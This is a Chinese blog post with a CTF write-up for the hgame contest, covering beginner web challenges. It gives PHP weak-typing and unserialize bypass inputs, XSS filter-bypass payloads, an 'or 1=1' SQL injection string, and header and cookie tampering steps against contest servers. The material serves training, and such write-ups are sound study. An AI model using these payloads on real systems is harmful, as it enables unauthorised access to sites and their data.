<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>
    杭电hgame wp | 道萝岗特森&#39;s Blog
  </title>
  <meta name="description" content="hello world">
  
  <meta name="keywords" content="
  writeup
  ">
  
  <meta name="author" content="daolgts">

  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta name="theme-color" content="#1e2327">
  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">

  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
  <link rel="stylesheet" href="/css/main.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  

  
<script>
  var _hmt = _hmt || [];
  (function(){var hm = document.createElement("script");
    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
</script>


  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
</head>

<body id="replica-app">

<nav class="navbar-wrapper">
  <div class="navbar">
    <div class="container clearfix">
      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>

      <div class="navbar-search float-left desktop-only">
        <div class="navbar-search-form">
          <label for="gsc-i-id1">This website</label>
          <div id="google-search">
            <gcse:search></gcse:search>
          </div>
        </div>
      </div>

      <ul class="navbar-nav float-left">
        
        <li><a href="/archives">Archives</a></li>
        
        <!--  -->
        
        <li><a href="/tags">Tags</a></li>
        
        
          <li><a href="/links">Links</a></li>
        
        
          <li><a href="/about">About</a></li>
        
        
      </ul>

      <ul class="navbar-nav user-nav float-right desktop-only">
        <li class="user-nav-notification">
          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
        </li>
        <li>
          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
        </li>
        <li class="user-nav-logo">
          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
        </li>
      </ul>
    </div>
  </div>
</nav>

<div class="main-container">
  <header class="header-wrapper desktop-only">
  <div class="container header-site-detail">
    <ul class="header-toolbar">
      <li class="clearfix">
        <a href="/archives" class="header-toolbar-left"><i
                  class="fa fa-file-text"></i> Posts </a>
        <a href="/archives"
           class="header-toolbar-right"> 34 </a>
      </li>
      <li>
        <a href="/tags" class="header-toolbar-left"><i
                  class="fa fa-tags"></i> Tags </a>
        <a href="/tags"
           class="header-toolbar-right"> 15 </a>
      </li>
      <li>
        <a href="/categories" class="header-toolbar-left"><i
                  class="fa fa-folder-open"></i> Categories </a>
        <a href="/categories"
           class="header-toolbar-right"> 0 </a>
      </li>
    </ul>
    <h2 class="header-title">
      <i class="fa fa-book text-muted"></i>
      <a href="/">道萝岗特森&#39;s Blog</a>
      
      
    </h2>
  </div>

  <div class="container">
    <div class="header-tab-wrapper clearfix">
      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
    </div>
  </div>
</header>


<div class="post-container container">
  <h3>
    <i class="fa fa-user-o"></i>
    daolgts

    <span class="post-date float-right" title="{{moment(1517733035000).format('MMM DD, YYYY, h:mm:ss A')}}">
      <i class="fa fa-pencil-square-o"></i>
      {{moment(1517733035000).fromNow()}}
    </span>
  </h3>

  <article class="post-content">
    <h1>杭电hgame wp</h1>
    <a id="more"></a>
<h2 id="Are-you-from-Europe"><a href="#Are-you-from-Europe" class="headerlink" title="Are you from Europe?"></a>Are you from Europe?</h2><ul>
<li><p>描述<br>证明血统的时候到了</p>
</li>
<li><p>URL <a href="http://123.206.203.108:10001/European.html" target="_blank" rel="noopener">http://123.206.203.108:10001/European.html</a></p>
</li>
<li><p>点金链接自己先抽了好多次，并没有ssr，看到“只有拥有 SSR 的真正欧皇才配兑换 flag ”，想着用xff和accept-language变成欧洲人，改了之后并没有用</p>
</li>
<li><p>查看源代码，发现给了js的代码，还有一段很长的代码比较奇怪</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&apos;&apos;.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return&apos;\\w+&apos;&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&apos;\\b&apos;+e(c)+&apos;\\b&apos;,&apos;g&apos;),k[c]);return p;&#125;(&apos;w p()&#123;b a=l(&quot;8！k，j 8 o 1 m？&quot;);5(!$(&quot;#4&quot;).7()&amp;&amp;!$(&quot;#9&quot;).7())&#123;2(&quot;i。&quot;);f&#125;b 1=&quot;&quot;;1+=&quot;&quot;;1+=&quot;&quot;;1+=&quot;&quot;;1+=&quot;y&quot;;1+=&quot;&#123;&quot;;1+=&quot;g&quot;;1+=&quot;h&quot;;1+=&quot;3&quot;;1+=&quot;6&quot;;1+=&quot;v&quot;;1+=&quot;h&quot;;1+=&quot;0&quot;;1+=&quot;s&quot;;1+=&quot;e&quot;;1+=&quot;u&quot;;1+=&quot;6&quot;;1+=&quot;0&quot;;1+=&quot;n&quot;;1+=&quot;r&quot;;1+=&quot;!&quot;;1+=&quot;&#125;&quot;;5(a)&#123;$(&quot;#4&quot;).d();$(&quot;#9&quot;).d();2(&quot;t。1: &quot;+1)&#125;q&#123;2(&quot;x。&quot;)&#125;&#125;&apos;,35,35,&apos;|flag|alert||serv5|if|_|html|SSR|craft5|buy|var||remove||return|T||你根本不是欧洲人|你愿意献祭你全部的|欧洲人|confirm|吗||来获取|soHappy|else|E||兑换成功|N|C|function|你失去了唯一的机会|hgame&apos;.split(&apos;|&apos;),0,&#123;&#125;))</span><br></pre></td></tr></table></figure>
</li>
<li><p>这里是js代码加密，在线解密（<a href="http://tool.chinaz.com/js.aspx）" target="_blank" rel="noopener">http://tool.chinaz.com/js.aspx）</a> 后，得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">function soHappy() &#123;</span><br><span class="line">    var buy = confirm(&quot;SSR！欧洲人，你愿意献祭你全部的 SSR 来获取 flag 吗？&quot;);</span><br><span class="line">    if (!$(&quot;#serv5&quot;).html() &amp;&amp; !$(&quot;#craft5&quot;).html()) &#123;</span><br><span class="line">        alert(&quot;你根本不是欧洲人。&quot;);</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    var flag = &quot;&quot;;</span><br><span class="line">    flag += &quot;&quot;;</span><br><span class="line">    flag += &quot;&quot;;</span><br><span class="line">    flag += &quot;&quot;;</span><br><span class="line">    flag += &quot;hgame&quot;;</span><br><span class="line">    flag += &quot;&#123;&quot;;</span><br><span class="line">    flag += &quot;T&quot;;</span><br><span class="line">    flag += &quot;h&quot;;</span><br><span class="line">    flag += &quot;3&quot;;</span><br><span class="line">    flag += &quot;_&quot;;</span><br><span class="line">    flag += &quot;C&quot;;</span><br><span class="line">    flag += &quot;h&quot;;</span><br><span class="line">    flag += &quot;0&quot;;</span><br><span class="line">    flag += &quot;s&quot;;</span><br><span class="line">    flag += &quot;e&quot;;</span><br><span class="line">    flag += &quot;N&quot;;</span><br><span class="line">    flag += &quot;_&quot;;</span><br><span class="line">    flag += &quot;0&quot;;</span><br><span class="line">    flag += &quot;n&quot;;</span><br><span class="line">    flag += &quot;E&quot;;</span><br><span class="line">    flag += &quot;!&quot;;</span><br><span class="line">    flag += &quot;&#125;&quot;;</span><br><span class="line">    if (buy) &#123;</span><br><span class="line">        $(&quot;#serv5&quot;).remove();</span><br><span class="line">        $(&quot;#craft5&quot;).remove();</span><br><span class="line">        alert(&quot;兑换成功。flag: &quot; + flag)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        alert(&quot;你失去了唯一的机会。&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>flag一目了然</p>
</li>
</ul>
<h2 id="special-number"><a href="#special-number" class="headerlink" title="special number"></a>special number</h2><ul>
<li><p>special number</p>
</li>
<li><p>知识点：PHP弱类型</p>
</li>
<li><p>URL <a href="http://118.25.18.223:10001" target="_blank" rel="noopener">http://118.25.18.223:10001</a></p>
</li>
<li><p>提示php弱类型并且给出源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&apos;key&apos;]))&#123;</span><br><span class="line">    $pattern = &apos;/^(?=.*[0-9].*)(?=.*[a-zA-Z].*).&#123;7,&#125;$/ &apos;;</span><br><span class="line">    $key = $_GET[&apos;key&apos;];</span><br><span class="line">    if(preg_match($pattern,$key)===0)&#123;</span><br><span class="line">        echo &quot;格式错误&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $lock=&quot;******************&quot;;</span><br><span class="line">        $b = json_decode($key);</span><br><span class="line">        if($b==$lock)</span><br><span class="line">            echo $flag;</span><br><span class="line">        else</span><br><span class="line">            echo &quot;this is no special number&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>json_decode会返回数组，但无法解码会返回null</p>
</li>
<li><p>构造key=0e12345，0=0，得到flag</p>
</li>
</ul>
<h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h2><ul>
<li><p>描述<br>only robot know where is the flag</p>
</li>
<li><p>flag格式为hgame开头</p>
</li>
<li><p>URL <a href="http://118.25.18.223:10003" target="_blank" rel="noopener">http://118.25.18.223:10003</a></p>
</li>
<li><p>提示robot，想到robots.txt,打开发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /f1aaaaaaaag.php</span><br></pre></td></tr></table></figure>
</li>
<li><p>打开f1aaaaaaaag.php</p>
</li>
<li><p><img src="https://s1.ax1x.com/2018/02/13/9YVHfg.png" alt="9YVHfg.png"></p>
</li>
<li><p>将user改为admin，go得到flag</p>
</li>
</ul>
<h2 id="tell-me-what-you-want"><a href="#tell-me-what-you-want" class="headerlink" title="tell me what you want"></a>tell me what you want</h2><ul>
<li>描述<br>想要flag吗？</li>
<li>URL <a href="http://123.206.203.108:10001/" target="_blank" rel="noopener">http://123.206.203.108:10001/</a></li>
<li>代开链接，再文本框中输入1，提交，显示需要用POST提交</li>
<li><img src="https://s1.ax1x.com/2018/02/13/9YVTk8.png" alt="9YVTk8.png"></li>
<li>POST提交后要改XFF头</li>
<li><img src="https://s1.ax1x.com/2018/02/13/9YVO6s.png" alt="9YVO6s.png"></li>
<li>用指定的“冰狐”浏览器</li>
<li><img src="https://s1.ax1x.com/2018/02/13/9YV7tS.png" alt="9YV7tS.png"></li>
<li>继续按要求改。。。</li>
<li><img src="https://s1.ax1x.com/2018/02/13/9YVXXn.png" alt="9YVXXn.png"></li>
<li>cookie改为1</li>
<li><img src="https://s1.ax1x.com/2018/02/13/9YVqpQ.png" alt="9YVqpQ.png"></li>
<li>得到flag</li>
<li><img src="https://s1.ax1x.com/2018/02/13/9YVLlj.png" alt="9YVLlj.png"></li>
</ul>
<h2 id="我们不一样"><a href="#我们不一样" class="headerlink" title="我们不一样"></a>我们不一样</h2><ul>
<li><p>描述<br>知识点：PHP弱类型</p>
</li>
<li><p>URL <a href="http://118.25.18.223:10002/" target="_blank" rel="noopener">http://118.25.18.223:10002/</a></p>
</li>
<li><p>源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_POST[&apos;str1&apos;])&amp;&amp;isset($_POST[&apos;str2&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">    if ($_POST[&apos;str1&apos;]!=$_POST[&apos;str2&apos;]&amp;&amp;strcmp($_POST[&apos;str1&apos;],$_POST[&apos;str2&apos;])==0) &#123;</span><br><span class="line">        echo &quot;flag is:&quot;.$flag;</span><br><span class="line">        exit();</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        echo &quot;Something wrong..&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>还是php弱类型</p>
</li>
<li><p>$_POST[‘str1’]!=$_POST[‘str2’]且strcmp($_POST[‘str1’],$_POST[‘str2’])==0</p>
</li>
<li><p>strcmp处理数组的话会返回null，null==0,得到flag</p>
</li>
<li><p>Post数据str1[]=1&amp;&amp;str2[]=2</p>
</li>
<li><p>得到flag</p>
</li>
</ul>
<h2 id="Random"><a href="#Random" class="headerlink" title="Random?"></a>Random?</h2><ul>
<li><p>描述<br>多random几次没准就随机到一样的值呢 PS:网不好vim线上改代码真是致命</p>
</li>
<li><p>URL <a href="http://123.206.203.108:10001/random.php" target="_blank" rel="noopener">http://123.206.203.108:10001/random.php</a></p>
</li>
<li><p>提示vim</p>
</li>
<li><p>vim备份文件<br>默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看</p>
</li>
<li><p>vim临时文件<br>vim中的swp即swap文件，在编辑文件时产生，它是隐藏文件，如果原文件名是submit，则它的临时文件.submit.swp。如果文件正常退出，则此文件自动删除。</p>
</li>
<li><p>发现存在.random.php.swp</p>
</li>
<li><p>打开后得到部分源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $flag;</span><br><span class="line">if ($emmm - &gt;public == $emmm - &gt;secret) &#123;</span><br><span class="line">    $emmm - &gt;secret = random_int(0, 100000000);</span><br><span class="line">    $emmm - &gt;public = random_int(0, 100000000);</span><br><span class="line">&#125;</span><br><span class="line">die(&quot;error&quot;);</span><br><span class="line">if (!is_object($emmm)) &#123;</span><br><span class="line">    $emmm = unserialize($_GET[&apos;emmm&apos;]);</span><br><span class="line">    if ($_GET[&apos;emmm&apos;]) &#123;&#125;</span><br><span class="line">    var $secret;</span><br><span class="line">    var $public; &#123;</span><br><span class="line">        class emmm include(&apos;flag.php&apos;);</span><br><span class="line">        error_reporting(0); &lt; ?php</span><br></pre></td></tr></table></figure>
</li>
<li><p>用到php反序列化，O:4:”emmm”:2:{s:6:”secret”;s:12:”aaaaaaaaaaaa”;s:6:”public”;s:12:”aaaaaaaaaaaa”;}</p>
</li>
</ul>
<h2 id="xss1"><a href="#xss1" class="headerlink" title="xss1"></a>xss1</h2><ul>
<li>源码过滤了script（全局，不分大小写），image（全局，不分大小写）和左圆括号</li>
<li>有html实体绕过左圆括号过滤</li>
<li>payload</li>
<li>&lt;IMG SRC=”.”onmouseover=alert&#40;1)&gt;<br><img src="https://s1.ax1x.com/2018/03/01/9rdBnK.png" alt="9rdBnK.png"></li>
</ul>
<h2 id="xss2"><a href="#xss2" class="headerlink" title="xss2"></a>xss2</h2><ul>
<li><p>源码过滤script（全局，不分大小写），image（全局，不分大小写），img（全局，不分大小写），左圆括号和右尖括号</p>
</li>
<li><p>需要闭合左右标签</p>
</li>
<li><p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">12&quot;&gt;&gt;</span><br><span class="line">&lt;a onmouseover=alert&amp;#40;1)&gt;xxs link&lt;/a&gt;</span><br><span class="line">&lt;input value=&quot;23</span><br></pre></td></tr></table></figure>
</li>
<li><p><img src="https://s1.ax1x.com/2018/03/01/9rwLIe.png" alt="9rwLIe.png"></p>
</li>
<li><p>圆括号和尖括号只过滤一次，可以先输入一次圆括号绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">12&quot;(&gt;&gt;</span><br><span class="line">&lt;a onmouseover=alert(1)&gt;xxs link&lt;/a&gt;</span><br><span class="line">&lt;input value=&quot;23</span><br></pre></td></tr></table></figure>
</li>
<li><p><img src="https://s1.ax1x.com/2018/03/01/9r0VRs.png" alt="9r0VRs.png"></p>
</li>
</ul>
<h2 id="最简单的sql题"><a href="#最简单的sql题" class="headerlink" title="最简单的sql题"></a>最简单的sql题</h2><ul>
<li>提示Only admin can get flag!!!!!</li>
<li>?username=admin’ or 1=1 %23&amp;pwd=2</li>
</ul>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ul>
<li>sqlmap跑一下就出来了。。。</li>
</ul>

  </article>
</div>


    




</div>

<div class="footer-wrapper container">
  <footer class="footer clearfix">
    <div class="clearfix">
    <a href="https://daolgts.github.io" class="footer-logo">
      <i class="fa fa-github"></i>
    </a>
    <ul class="footer-social-link">
      <li>© 2019 daolgts</li>
      <li><a href="https://daolgts.github.io">Home</a></li>
      
      <li><a href="https://github.com/daolgts">Github</a></li>
      
    </ul>
    <div class="footer-theme-info">
      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
    </div>
    </div>
    
  </footer>
</div>


<script>
  (function() {
    var cx = '005157513716557594323:jvii0oiejlb';
    var gcse = document.createElement('script');
    gcse.type = 'text/javascript';
    gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
      '//cse.google.com/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(gcse, s);
  })();
</script>



<script src="/js/main.js"></script>

</body>
</html>
